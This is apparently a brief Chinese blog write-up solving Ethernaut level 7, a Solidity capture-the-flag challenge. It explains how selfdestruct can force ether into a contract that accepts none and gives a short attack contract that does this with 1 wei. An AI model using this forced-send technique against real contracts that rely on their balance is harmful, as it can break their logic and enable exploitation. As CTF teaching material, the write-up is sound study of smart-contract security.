---
title: ethernaut NO.7
tags: TeXt
---

 我们先来看合约代码和要求：

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force { /*
                   MEOW ?
         /\_/\   /
    ____/ o o \
    /~____  =ø= /
    (______)__m_m)
                   */ }

```

**要求使合约的余额大于一**

**考点：selfdestruct的使用**：*可以使一个合约被删除然后将其中的余额强制性发送给另一个合约*

攻击合约如下

```solidity
contract Hack{
    constructor(address payable  _target) payable {
        selfdestruct(_target);
    }
}
```

将1wei传入合约兵在实例地址deploy后就可以完成此题；